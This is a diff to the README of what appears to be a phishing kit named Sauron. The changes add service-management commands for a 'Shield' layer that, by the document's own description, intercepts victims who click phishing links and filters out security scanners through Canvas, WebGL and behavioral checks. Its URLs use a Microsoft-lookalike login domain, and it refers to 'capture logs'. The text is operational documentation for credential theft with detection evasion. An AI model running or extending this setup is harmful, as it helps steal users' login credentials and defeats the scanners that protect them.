@@ -108,7 +108,6 @@ sudo ./install-production.sh
 ./configure-env.sh --test-domain # Test domain connectivity
 ./configure-env.sh --check-ssl  # Check SSL certificates
 ./configure-env.sh --test-shield # Test Shield Gateway
-./configure-env.sh --test-nginx # Test nginx + Shield integration
 ```
 
 ### Manual Configuration
@@ -130,14 +129,22 @@ TURNSTILE_SECRET=your_secret_here
 
 ```bash
 # Service operations
-sudo systemctl status sauron    # Check service status
-sudo systemctl restart sauron   # Restart service
-sudo systemctl stop sauron      # Stop service
+sudo systemctl status sauron shield  # Check both service status
+sudo systemctl restart sauron shield # Restart both services
+sudo systemctl stop sauron shield   # Stop both services
+sudo systemctl start sauron shield  # Start both services
+
+# Individual service operations
+sudo systemctl status sauron        # Check Sauron only
+sudo systemctl status shield        # Check Shield only
+sudo systemctl restart sauron       # Restart Sauron only
+sudo systemctl restart shield       # Restart Shield only
 
 # View logs
-sudo journalctl -u sauron -f    # Live service logs
-tail -f logs/system.log         # System logs
-tail -f logs/emits.log          # Capture logs
+sudo journalctl -u sauron -f        # Live Sauron logs
+sudo journalctl -u shield -f        # Live Shield logs
+tail -f logs/system.log              # System logs
+tail -f logs/emits.log               # Capture logs
 ```
 
 ### System Operations
@@ -148,7 +155,6 @@ tail -f logs/emits.log          # Capture logs
 ./verify-shield.sh              # Detailed Shield Gateway verification
 ./test-shield-connectivity.sh   # Test Shield connectivity and functionality
 ./test-firebase.sh              # Test Firebase connectivity
-./test-nginx-shield.sh          # Test nginx + Shield integration
 
 # Updates
 sudo ./update-sauron.sh --check # Check for updates
@@ -172,31 +178,47 @@ Shield is an automatic bot filtering layer that protects Sauron from security sc
 - User clicks phishing link → Shield intercepts first
 - Bot detection runs silently (Canvas, WebGL, behavioral analysis)
 - Bots are blocked → Legitimate users pass through to Sauron
-- Automatically started by Sauron when configured
+- Runs as independent systemd service
 
 ### Service Management
 
 ```bash
-# Check if Shield is running (managed by Sauron)
-ps aux | grep shield
+# Shield service operations
+sudo systemctl status shield      # Check Shield service status
+sudo systemctl restart shield    # Restart Shield service
+sudo systemctl stop shield       # Stop Shield service
+sudo systemctl start shield      # Start Shield service
 
-# Shield logs are in Sauron's output
-sudo journalctl -u sauron -f | grep -i shield
+# View Shield logs
+sudo journalctl -u shield -f     # Live Shield logs
+sudo journalctl -u shield --since "1 hour ago"  # Recent Shield logs
 
-# Restart Shield (restart Sauron)
-sudo systemctl restart sauron
+# Check both services
+sudo systemctl status sauron shield  # Check both services
+sudo systemctl restart sauron shield # Restart both services
+```
 
-# Verify Shield installation and configuration
-./verify-shield.sh
+### Development Mode
 
-# Test Shield connectivity and functionality
-./test-shield-connectivity.sh
+```bash
+# Terminal 1: Start Sauron
+go run main.go
 
-# Test Shield subdomain
-curl -k https://verify.yourdomain.com
+# Terminal 2: Start Shield
+cd shield-domain
+go run main.go
 
-# Test nginx + Shield integration
-./test-nginx-shield.sh
+# Development URLs
+# Sauron: https://login.microsoftlogin.com:443
+# Shield: https://secure.get-auth.com:8444
+```
+
+### Production Mode
+
+```bash
+# Both services run independently on port 443
+# Sauron: https://login.microsoftlogin.com
+# Shield: https://secure.get-auth.com
 ```
 
 ### Configuration
@@ -300,8 +322,6 @@ curl -k https://verify.yourdomain.com
 # Check Shield logs
 sudo journalctl -u sauron -f | grep -i shield
 
-# Test nginx + Shield integration
-./test-nginx-shield.sh
 ```
 
 **If firebaseAdmin.json is missing:**
@@ -397,7 +417,6 @@ sudo ./scripts/uninstall-sauron.sh
 - All SSL certificates (local and certmagic)
 - All logs and temporary files
 - All systemd services
-- All nginx configurations
 - All user accounts and groups
 - All firewall rules
 
